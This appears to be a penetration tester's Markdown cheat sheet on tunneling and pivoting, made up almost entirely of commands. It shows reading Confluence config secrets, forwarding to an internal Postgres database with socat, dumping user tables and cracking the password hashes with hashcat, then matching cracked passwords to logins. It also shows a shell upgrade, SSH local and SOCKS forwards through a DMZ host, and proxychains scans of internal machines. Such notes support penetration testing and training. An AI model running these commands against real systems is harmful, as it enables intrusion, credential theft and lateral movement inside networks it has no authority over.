# Tunneling

## Port forwarding

### Socat

```
cat /var/atlassian/application-data/confluence/confluence.cfg.xml # config file...
socat -ddd TCP-LISTEN:2345,fork TCP:DbHostIP:5432
psql -h GatewayIP -p 2345 -U postgres
\l
\c mydb
select table_schema,table_name from information_schema.tables where table_name like '%user%;
\o hashes.txt
select * from user_table
\o
\q
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt # Atlassian hashcat code: hashcat -h
vim afterhashcat.txt
tr -d ' ' hashes.txt | awk -F'|' '(NR >2) {print $2, $17}' > loginpass.txt
vim loginpass.txt # clean ?
awk -F' ' '{a[$1]=a[$1]?a[$1]":"$2:$2":"$1;}END{for (i in a) print a[i];}' loginpass.txt afterhashcat.txt | awk -F ':' '$3 {print $1, $3}' > final.txt
```
Awk tips: https://www.theunixschool.com/2012/06/awk-10-examples-to-group-data-in-csv-or.html

### Ssh

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
nc -zv -w 1 $IP $Port # listen, verbose, timeout 1sec

IpDmzOut$ ssh -N -L 0.0.0.0:$PortDmzOut:$IpDeepInternal:$PortDeepInternal user@$IpDmzIn # from $IpDmzOut: out | dmz | in
Kali$ smbclient -p $PortDmzOut -L //$IpDmzOut/ -U someuser --password=somepass

IpDmzOut$ ssh -N -D 0.0.0.0:$PortDmzOut user@$IpDmzIn
Kali$ vi /etc/proxychains4.conf
    socks5 $IpDmzIn $PortDmzOut
Kali$ proxychains smbclient -L //$IpDeepInternal/ -U someuser --password=somepass
Kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn $IpDeepInternal

```

### Windows

```

```


